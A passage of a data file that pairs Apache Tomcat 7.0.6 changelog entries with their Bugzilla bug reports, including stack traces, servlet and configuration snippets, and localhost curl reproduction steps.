	at java.net.ServerSocket.<init>(ServerSocket.java:141)
	at org.apache.tomcat.util.net.DefaultServerSocketFactory.createSocket(DefaultServerSocketFactory.java:52)
	at org.apache.tomcat.util.net.JIoEndpoint.init(JIoEndpoint.java:357)
	... 14 more
03.06.2010 3:14:13 org.apache.catalina.startup.Catalina start
SEVERE: Catalina.start: 
LifecycleException:  Protocol handler initialization failed: java.net.BindException: Address already in use: JVM_Bind <null>:8080
	at org.apache.catalina.connector.Connector.startInternal(Connector.java:868)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:437)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:648)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:576)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:415)
03.06.2010 3:14:13 org.apache.catalina.startup.Catalina start
INFO: Server startup in 4737 ms
03.06.2010 3:14:13 org.apache.catalina.core.StandardServer await
SEVERE: StandardServer.await: create[localhost:8005]: 
java.net.BindException: Address already in use: JVM_Bind
	at java.net.PlainSocketImpl.socketBind(Native Method)
	at java.net.PlainSocketImpl.bind(PlainSocketImpl.java:365)
	at java.net.ServerSocket.bind(ServerSocket.java:319)
	at java.net.ServerSocket.<init>(ServerSocket.java:185)
	at org.apache.catalina.core.StandardServer.await(StandardServer.java:359)
	at org.apache.catalina.startup.Catalina.await(Catalina.java:654)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:608)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:415)
03.06.2010 3:14:13 org.apache.catalina.startup.Catalina stop
SEVERE: Catalina.stop
LifecycleException:  An invalid Lifecycle transition was attempted ([before_stop]) for component [StandardServer[8005]] in state [STARTING]
	at org.apache.catalina.util.LifecycleBase.invalidTransition(LifecycleBase.java:315)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:204)
	at org.apache.catalina.startup.Catalina.stop(Catalina.java:641)
	at org.apache.catalina.startup.Catalina$CatalinaShutdownHook.run(Catalina.java:783)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49372
Catalina|Tomcat 7.0.6 (markt)|fix|49543|Allow Tomcat to use shared data sources with per application credentials. (fhanik)|"Request for a ""shared"" datasource configuration as in DBCP"|"The ability to configure the datasource at the server level and have it shared amongst all applications on that server with each application supplying their own credentials for the datasource. This type of configuration is supported by DBCP and is called a ""shared"" datasource configuration."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49543
Catalina|Tomcat 7.0.6 (markt)|fix|49650|Remove unnecessary entries package.access property defined in catalina.properties. Patch provided by Owen Farrell. (markt)|Streamline package.access property definition in catalina.properties|"Created attachment 25804 [details]
catalina.properties Modifications

The package.access property defined in catalina.properties stipulates a restrictions on both 'sun.' packages and 'sun.beans.' packages.

However, the latter restriction is implied based on the broader 'sun.' package restriction.

Additionally, the failsafe field defined in org.apache.catalina.security.SecurityConfig does not include sun.beans in the default list of package access restrictions. I would think that the default property file should match the failsafe SecurityConfig field."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49650
Catalina|Tomcat 7.0.6 (markt)|fix|50106|Correct several MBean descriptors. Patch provided by Eiji Takahashi. (markt)|Fix several mbean descriptors|"Fix several mbean descriptors: 
 - Add writeable=""false"" to Lifecycle stateName(setter is not provided for stateName).
 - Remove obsolete bufferSize from CoyoteConnector.
 - Add packetSize to CoyoteConnector."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50106
Catalina|Tomcat 7.0.6 (markt)|update||Further performance improvements to session ID generation. Remove legacy configuration options that are no longer required. Provide additional options to control the SecureRandom instances used to generate session IDs. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix|50201|Update the access log reference in StandardEngine when the ROOT web application is redeployed, started, stopped or defaultHost is changed. (markt/kkolinko)|StandardEngine.defaultAccessLog may become stale when ROOT webapp is redeployed|"In tc6.0.x-dev after r1030188 (will be 6.0.30) and in TC 7.0.4:

The method StandardEngine.logAccess(..) performs lookup of a default AccessLog implementation and caches it as StandardEngine.defaultAccessLog.  This value is not updated if the default host or its ROOT webapp are changed.  The most important use case here is when the ROOT webapp is redeployed or restarted.

To reproduce:
1. Configure an access log valve in the ROOT webapp. Remove access log valves from Engine and Host if there are any.
2. Start Tomcat and do some malformed request
3. Undeploy and redeploy the ROOT webapp.
E.g. rename ROOT -> ROOT1, wait until undeployment happens and rename it back.
4. Do some malformed request.
Expected behaviour: the request has to be logged.
Actual behaviour: the request is not logged.


Notes:
1. This does not happen if an access log valve is also configured on the Host or Engine. The default server.xml of Tomcat 7 does have such a valve in the default Host.
2. Restarting the ROOT webapp (e.g. touching its web.xml) is not enough to trigger this. (Apparently it does not cause closing of the valve).
3. It is not detected as a memory leak. (Apparently the Valve is not loaded with webapp's classloader).

So, the requests not being logged is the only effect of this issue that I am observing."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50201
Catalina|Tomcat 7.0.6 (markt)|add|50282|Load javax.security.auth.login.Configuration with JreMemoryLeakPreventionListener to avoid memory leak when stopping a web application that would use JAAS. (slaurent)|Reference from javax.security.auth.login.LoginContext.contextClassLoader initalized in static code block prevents an undeployed Web application from being garbage collected (similar to #49669)|"The class javax.security.auth.login.LoginContext has a ""contextClassLoader"" field that I believe is causing a similar problem as identified in bug #49669, which is related to the class not being garbage collected even though the application has been undeployed.

https://issues.apache.org/bugzilla/show_bug.cgi?id=49669

I was able to notice this by deploying a very simple spring-based webapp that utilizes javax.security for authentication in which the LoginContext class is used.

I then used YourKit profiler as specified in this writeup to find any lingering classes without instances:

http://www.yourkit.com/docs/kb/class_loaders.jsp

The following class had the most instances (inside of a WebappClassLoader):
""contextClassLoader of javax.security.auth.login.Configuration [Class]""

This looks almost identical to bug #49669 with the only difference being that the contextClassLoader field isn't static, however it is initialized in a static code block.  Thus, it looks like the solution for bug #49669 would solve this problem as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50282
Catalina|Tomcat 7.0.6 (markt)|fix|50351|Fix the regression that broke BeanFactory resources caused by the previous fix for 50159. (markt)|javax.naming.NamingException: No set method found for property: singleton|"Get trunk here http://people.apache.org/~markt/dev/tomcat-7/v7.0.5/
The application that works with 7.0.4 now gets this error after execution:

19:20:02,926 ERROR DatasourceConnectionProvider:78 - Could not find datasource: java:comp/env/jdbc/myAppName

javax.naming.NamingException: No set method found for property: singleton
	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:215)
	at org.apache.naming.factory.ResourceFactory.getObjectInstance(ResourceFactory.java:142)
	at javax.naming.spi.NamingManager.getObjectInstance(Unknown Source)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:826)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
	at org.apache.naming.SelectorContext.lookup(SelectorContext.java:158)
	at javax.naming.InitialContext.lookup(Unknown Source)
	at org.hibernate.connection.DatasourceConnectionProvider.configure(DatasourceConnectionProvider.java:75)
	at org.hibernate.connection.ConnectionProviderFactory.newConnectionProvider(ConnectionProviderFactory.java:143)
	at org.hibernate.ejb.InjectionSettingsFactory.createConnectionProvider(InjectionSettingsFactory.java:51)
	at org.hibernate.cfg.SettingsFactory.buildSettings(SettingsFactory.java:91)
	at org.hibernate.cfg.Configuration.buildSettingsInternal(Configuration.java:2163)
	at org.hibernate.cfg.Configuration.buildSettings(Configuration.java:2159)
	at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1383)
	at org.hibernate.cfg.AnnotationConfiguration.buildSessionFactory(AnnotationConfiguration.java:954)
	at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:892)
	at org.hibernate.ejb.HibernatePersistence.createEntityManagerFactory(HibernatePersistence.java:57)
	at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:48)
	at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:32)
	at net.metha.utils.persistence.JPAUtil.<clinit>(JPAUtil.java:24)
	at net.metha.bestfork.servlets.filters.JPASessionFilter.doFilter(JPASessionFilter.java:19)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:244)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:240)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:561)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:108)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:558)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:379)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:243)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:259)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:281)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)
27/11/2010 19:20:02 org.apache.catalina.core.StandardWrapperValve invoke
GRAVE: Servlet.service() for servlet [Faces Servlet] in context with path [/bestforkprime] threw exception [Filter execution threw an exception] with root cause
javax.naming.NamingException: No set method found for property: singleton
	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:215)
	at org.apache.naming.factory.ResourceFactory.getObjectInstance(ResourceFactory.java:142)
	at javax.naming.spi.NamingManager.getObjectInstance(Unknown Source)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:826)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
	at org.apache.naming.SelectorContext.lookup(SelectorContext.java:158)
	at javax.naming.InitialContext.lookup(Unknown Source)
	at org.hibernate.connection.DatasourceConnectionProvider.configure(DatasourceConnectionProvider.java:75)
	at org.hibernate.connection.ConnectionProviderFactory.newConnectionProvider(ConnectionProviderFactory.java:143)
	at org.hibernate.ejb.InjectionSettingsFactory.createConnectionProvider(InjectionSettingsFactory.java:51)
	at org.hibernate.cfg.SettingsFactory.buildSettings(SettingsFactory.java:91)
	at org.hibernate.cfg.Configuration.buildSettingsInternal(Configuration.java:2163)
	at org.hibernate.cfg.Configuration.buildSettings(Configuration.java:2159)
	at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1383)
	at org.hibernate.cfg.AnnotationConfiguration.buildSessionFactory(AnnotationConfiguration.java:954)
	at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:892)
	at org.hibernate.ejb.HibernatePersistence.createEntityManagerFactory(HibernatePersistence.java:57)
	at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:48)
	at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:32)
	at net.metha.utils.persistence.JPAUtil.<clinit>(JPAUtil.java:24)
	at net.metha.bestfork.servlets.filters.JPASessionFilter.doFilter(JPASessionFilter.java:19)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:244)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:240)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:561)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:108)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:558)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:379)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:243)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:259)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:281)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50351
Catalina|Tomcat 7.0.6 (markt)|fix|50352|Ensure that AsyncListener.onComplete() is fired when AsyncContext.complete() is called. (markt)|AsyncListener.onComplete is not called after AsyncContext.complete() is called|"Using servlet 3 async features, when asyncContext.complete(); is called from an async thread, the AsyncListener onComplete() method is not called though it should be.

Example Servlet :


package test;

import java.io.IOException;

import javax.servlet.AsyncContext;
import javax.servlet.AsyncEvent;
import javax.servlet.AsyncListener;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class MyServlet
 */
@WebServlet(value = ""/MyServlet"", asyncSupported = true)
public class MyServlet extends HttpServlet implements AsyncListener {
	private static final long serialVersionUID = 1L;

	protected void doGet(HttpServletRequest request,
			HttpServletResponse response) throws ServletException, IOException {
		final AsyncContext asyncContext = request.startAsync(request, response);
		asyncContext.addListener(this);

		asyncContext.start(new Runnable() {

			@Override
			public void run() {
				try {
					Thread.sleep(5 * 1000);
					asyncContext.getResponse().getWriter().write(""Hello world"");
					asyncContext.complete();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	@Override
	public void onComplete(AsyncEvent arg0) throws IOException {
		System.out.println(""onComplete "" + arg0);
	}

	@Override
	public void onError(AsyncEvent arg0) throws IOException {
		System.out.println(""onError "" + arg0);
	}

	@Override
	public void onStartAsync(AsyncEvent arg0) throws IOException {
		System.out.println(""onStartAsync "" + arg0);
	}

	@Override
	public void onTimeout(AsyncEvent arg0) throws IOException {
		System.out.println(""onTimeout "" + arg0);
	}
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50352
Catalina|Tomcat 7.0.6 (markt)|fix|50358|Set the correct LifecycleState when stopping instances of the deprecated Embedded class. (markt)|Embedded.stopInternal sets state to STARTING, should be STOPPING|"Embedded.stopInternal invokes setState(LifecycleState.STARTING), this should be changed to setState(LifecycleState.STOPPING).

Setting LifecycleState.STARTING during stopInternal leads to a LifecycleException when the Embedded is shut down:
LifecycleException:  An invalid Lifecycle transition was attempted ([after_stop]) for component [StandardService[null]] in state [STARTING]
	at org.apache.catalina.util.LifecycleBase.invalidTransition(LifecycleBase.java:321)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:226)
	at de.javakaffee.web.msm.MemcachedSessionManagerIntegrationTest.tearDown(MemcachedSessionManagerIntegrationTest.java:112)

This failure leads to failing tests in my case.

I'm using the (deprecated) Embedded for integration testing the memcached-session-manager (http://code.google.com/p/memcached-session-manager/).
I'm just working on a tomcat7 branch, which shall diverge as little as possible from the master/trunk, therefore I'm still using Embedded instead of the newly introduced Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50358
Catalina|Tomcat 7.0.6 (markt)|fix||Further Lifecycle refactoring for Connectors and associated components. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix||Correct handling of versioned web applications in deployer. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix||Correct removal of LifeCycleListeners from Containers via JMX. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix||Don't use nulls to construct log messages. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix||Code clean-up. Replace use of inefficient constructors with more efficient alternatives. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix|50411|Ensure sessions are removed from the Store associated with a PersistentManager. (markt)|invalid sessions not removed from PersistenManager store|"ChangeSet r1036595 in StandardSession no longer remove sessions from PersistentManger store.

I think PersistentMangerBase must now override method remove(Session session, boolean update) and no longer method remove(Session session)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50411
Catalina|Tomcat 7.0.6 (markt)|fix|50413|Ensure 304 responses are not returned when using static files as error pages. (markt/kkolinko)|Tomcat returns 304 instead of 404 response for static custom 404 error file|"When using a static html file for 404 errors and the client sends a request to a file whoch doesn't exist, and adds a ""If-Modified-Since"" header with a date that is newer than the modification date of the static error file, then Tomcat returns ""302 Not Modofied"" instead of ""404 Not Found"".

Steps to reproduce:
1) Make a simple webapp that uses a static html file as custom error page for 404 errors, like this (web.xml):

  <error-page>
    <error-code>404</error-code>
    <location>/errorpages/404.html</location>
  </error-page>

2) Do a GET request to a URL which points to a file that doesn't exist, and add a ""If-Modified-Since"" header with a date that is newer than the modification date of the 404 error file (the date may also be in the future), e.g.

GET /MyWebApp/AUrlToAFileWhichDoesNotExist.gif HTTP/1.1
Host: localhost
Keep-Alive: 115
Connection: keep-alive
If-Modified-Since: Tue, 08 Nov 2015 15:07:52 GMT 

(replace ""MyWebApp"" with your webapp's name)

3) Tomcat returns ""HTTP/1.1 302 Not Modified"" instead of ""HTTP/1.1 404 Not Found"".


Actual Results: Tomcat returns a ""302 Not Modified"" response, because it seems to compare the date of the ""If-Modified-Header"" with the date of the static 404 error file.

Expected Results: Tomcat returns a ""404 Not Found"" response, because the requested file does not exist.


If you omit the ""If-Modified-Since"" header or use a date that is older than the date of the error file, Tomcat correctly returns ""404 Not Found"", but adds an ""Last-Modified"" header with the modification date of the 404 file.


This behavior caused invalid 302 responses to be sent over the ISAPI redirector (bug 50363, with enabled chunked encoding support) when I was viewing my site in Firefox and pressed F5 to refresh it, because I think as of bug 49591, Tomcat uses chunked encoding for this response, which the ISAPI redirector didn't check.

I tested on Tomcat 7.0.5 on 32-Bit Windows XP, with Tomcat Native 1.1.20, on Java 1.6.0_22."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50413
Catalina|Tomcat 7.0.6 (markt)|fix|50448|Fix possible IllegalStateException caused by recent session management refactoring. (markt)|StandardSession.expire causes IllegalStateException: getCreationTime: Session already invalidated|"Hi,

when verifying the fix for #50360 I ran into an issue with expired sessions during processExpires:

Dec 10, 2010 12:59:32 AM org.apache.catalina.core.ContainerBase backgroundProcess
WARNING: Exception processing manager de.javakaffee.web.msm.MemcachedBackupSessionManager[/] background process
java.lang.IllegalStateException: getCreationTime: Session already invalidated
	at org.apache.catalina.session.StandardSession.getCreationTime(StandardSession.java:1096)
	at org.apache.catalina.session.ManagerBase.remove(ManagerBase.java:802)
	at org.apache.catalina.session.StandardSession.expire(StandardSession.java:840)
	at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:655)
	at org.apache.catalina.session.ManagerBase.processExpires(ManagerBase.java:609)
	at org.apache.catalina.session.ManagerBase.backgroundProcess(ManagerBase.java:594)
	at de.javakaffee.web.msm.MemcachedBackupSessionManager.backgroundProcess(MemcachedBackupSessionManager.java:1130)
	at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1214)

AFAICS in MemcachedBackupSessionManager I could override remove(Session session, boolean update) with calling super.remove(session, false) for invalid sessions.

Another option would be to change StandardSession.expire(StandardSession.java:840) so that it does not invoke manager.remove(this, true) but manager.remove(this, false).

Or even better: change ManagerBase.remove(ManagerBase.java:802) to invoke some session.getCreationTimeInternal() which skips validation.

What do you think?

Cheers,
Martin"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50448
Catalina|Tomcat 7.0.6 (markt)|fix||Ensure aliases settings for a context are retained after a context is reloaded. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix||Log a warning if context.xml files define values for properties that do not exist (e.g. if there is a typo in a property name). (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix|50453|Correctly handle multiple X-Forwarded-For headers in the RemoteIpFilter and RemoteIpValve. Patch provided by Jim Riggs. (markt)|Multiple X-Forwarded-For headers not handled by RemoteIP valve|"When a request comes in with multiple X-Forwarded-For headers the RemoteIP valve should be examining all of them in reverse order.

As defined by the standard:
""Multiple message-header fields with the same field-name MAY be present in a message if and only if the entire field-value for that header field is defined as a comma-separated list [i.e., #(values)]. It MUST be possible to combine the multiple header fields into one ""field-name: field-value"" pair, without changing the semantics of the message, by appending each subsequent field-value to the first, each separated by a comma. The order in which header fields with the same field-name are received is therefore significant to the interpretation of the combined field value, and thus a proxy MUST NOT change the order of these field values when a message is forwarded.""

thus:
(a)
X-Forwarded-For: 192.168.0.3
X-Forwarded-For: 222.234.0.4

Is semantically equivalent to:
(b)
X-Forwarded-For: 192.168.0.3, 222.234.0.4

However (a) is not handled by the RemoteIP valve as it only ever looks at the first header.

For reference, this was raised on the HAproxy mailing list:
http://www.formilux.org/archives/haproxy/1012/4122.html
and tomcat user's mailing list:
http://mail-archives.apache.org/mod_mbox/tomcat-users/201012.mbox/%3C4D022C57.1070005@apache.org%3E

Tomcat users suggested raising a bug. Hence this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50453
Catalina|Tomcat 7.0.6 (markt)|add|50541|Add support for setting the size limit and time limit for LDAP searches when using the JNDI Realm with userSearch. (markt)|JNDIRealm: support configuring LDAP sizeLimit (countLimit in SearchControls)|"Today, when enabling an application's LDAP authentication through Active Directory, I've discovered that with apparently a completely correct LDAP Realm configuration on the Tomcat side, AD returns the following error all the time:

LDAP: error code 1 - 000004DC: LdapErr: DSID-0C0906DD, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1771

After some hours of Googling and experimenting with referrals, subtree search modes et cetera, I've found out (through network packet analysis) that the problem is caused by LDAP sizeLimit being set to zero in the searches sent by Tomcat.

After closer inspection of Tomcat source code, I've dug out this class:

http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/catalina/realm/JNDIRealm.java

And this code fragment in the method getUserBySearch(DirContext context, String username, String[] attrIds):



        // Set up the search controls
        SearchControls constraints = new SearchControls();

        if (userSubtree) {
            constraints.setSearchScope(SearchControls.SUBTREE_SCOPE);
        }
        else {
            constraints.setSearchScope(SearchControls.ONELEVEL_SCOPE);
        }

        // Specify the attributes to be retrieved
        if (attrIds == null)
            attrIds = new String[0];
        constraints.setReturningAttributes(attrIds);

        NamingEnumeration<SearchResult> results =
            context.search(userBase, filter, constraints);

As you can see (http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html#JNDIRealm), currently there's no way to customize other search controls than search scope and returning attributes by means of XML configuration.

In javax.naming.directory.SearchControls, the LDAP sizeLimit is determined by the countLimit property:
http://download.oracle.com/javase/6/docs/api/javax/naming/directory/SearchControls.html#setCountLimit(long)

I propose to create a new configuration attribute for the Realm XML element that would enable setting this limit, and naming it ""sizeLimit"" (not ""countLimit"" like the Java property, because in LDAP world people are used to the former term). While we're at it, adding ""timeLimit"" (measured in milliseconds) attribute would be also nice.

So for example one would be able to set 1000 entries sizeLimit and 5 seconds timeLimit this way:

<Realm className=""org.apache.catalina.realm.JNDIRealm"" debug=""99""
     connectionURL=""ldap://localhost:389""
       userPattern=""uid={0},ou=people,dc=mycompany,dc=com""
       sizeLimit=""1000""
       timeLimit=""5000""
/>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50541
Catalina|Tomcat 7.0.6 (markt)|update||All configuration options that use regular expression now require a single regular expression (using java.util.regex) rather than a list of comma-separated or semi-colon-separated expressions. (markt)|||
Catalina|Tomcat 7.0.6 (markt)|fix|50496|Bytes sent in the access log are now counted after compression, chunking etc rather than before. (markt)|AccessLogValve not logging size correctly for %B with enabled compression|"During a log analysis of before and after enabling http/1.1 compression in tomcat 6.0.29 (and also earlier) we see that the access-logs do NOT sow a difference in sizes reported.

Drilling down into the issue it seems as if the size reported with %B is not taking compression into account even though the documentation says:
%B - Bytes sent, excluding HTTP headers

A quick comparison with the apache httpd 2.2 shows that httpd IS logging compressed data sizes.

Here an easy means to replicate:

* take a stock tomcat 6.0.29
* configure tomcat to use compression and enable access logging
* start tomcat
* do 2 web-requests with (say curl) to http://127.0.0.1:8080/ one time without the header ""Acccept-encoding: gzip"" the other time with the header added
* look at the access-logfile and you see that both get reported as 7777 Bytes sent

This is a bit of a pain, as there is no way to report the compressed size in any other way with tomcat (like with logging notes with apache httpd) and it would be very helpful if the real size was available for reporting on efficiency without having to resort to use tcpdump estimates...

Thanks,
        Martin Sperl

P.s: Here the glory details of the way this can get replicated:
msmac:apache-tomcat-6.0.29 sperl$ diff -u conf/server.xml.orig conf/server.xml--- conf/server.xml.orig        2010-07-19 15:01:51.000000000 +0200
+++ conf/server.xml     2010-12-18 11:09:17.000000000 +0100
@@ -68,6 +68,7 @@
     -->
     <Connector port=""8080"" protocol=""HTTP/1.1"" 
                connectionTimeout=""20000"" 
+compression=""on""
                redirectPort=""8443"" />
     <!-- A ""Connector"" using the shared thread pool-->
     <!--
@@ -137,10 +138,8 @@
 
         <!-- Access log processes all example.
              Documentation at: /docs/config/valve.html -->
-        <!--
         <Valve className=""org.apache.catalina.valves.AccessLogValve"" directory=""logs""  
                prefix=""localhost_access_log."" suffix="".txt"" pattern=""common"" resolveHosts=""false""/>
-        -->
 
       </Host>
     </Engine>
msmac:apache-tomcat-6.0.29 sperl$ bin/catalina.sh start
Using CATALINA_BASE:   /Users/sperl/noTimeMachine/apache-tomcat-6.0.29
Using CATALINA_HOME:   /Users/sperl/noTimeMachine/apache-tomcat-6.0.29
Using CATALINA_TMPDIR: /Users/sperl/noTimeMachine/apache-tomcat-6.0.29/temp
Using JRE_HOME:        /System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home
Using CLASSPATH:       /Users/sperl/noTimeMachine/apache-tomcat-6.0.29/bin/bootstrap.jar
msmac:apache-tomcat-6.0.29 sperl$ curl -vv http://127.0.0.1:8080/ |wc * About to connect() to 127.0.0.1 port 8080 (#0)
*   Trying 127.0.0.1...   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0connected
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.21.2 (x86_64-apple-darwin10.4.0) libcurl/7.21.2 OpenSSL/1.0.0a zlib/1.2.5 libidn/1.19
> Host: 127.0.0.1:8080
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Accept-Ranges: bytes
< ETag: W/""7777-1279544386000""
< Last-Modified: Mon, 19 Jul 2010 12:59:46 GMT
< Content-Type: text/html
< Content-Length: 7777
< Date: Sun, 19 Dec 2010 12:17:30 GMT
< 
{ [data not shown]
100  7777  100  7777    0     0   134k      0 --:--:-- --:--:-- --:--:--  138k* Connection #0 to host 127.0.0.1 left intact

* Closing connection #0
     213     623    7777
msmac:apache-tomcat-6.0.29 sperl$ tail -1 logs/localhost_access_log.2010-12-19.txt 
127.0.0.1 - - [19/Dec/2010:13:17:30 +0100] ""GET / HTTP/1.1"" 200 7777
msmac:apache-tomcat-6.0.29 sperl$ curl -vv --header ""Accept-Encoding: gzip"" http://127.0.0.1:8080/ | wc
* About to connect() to 127.0.0.1 port 8080 (#0)
*   Trying 127.0.0.1...   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0connected
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.21.2 (x86_64-apple-darwin10.4.0) libcurl/7.21.2 OpenSSL/1.0.0a zlib/1.2.5 libidn/1.19
> Host: 127.0.0.1:8080
> Accept: */*
> Accept-Encoding: gzip
> 
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Accept-Ranges: bytes
< ETag: W/""7777-1279544386000""
< Last-Modified: Mon, 19 Jul 2010 12:59:46 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Content-Encoding: gzip
< Vary: Accept-Encoding
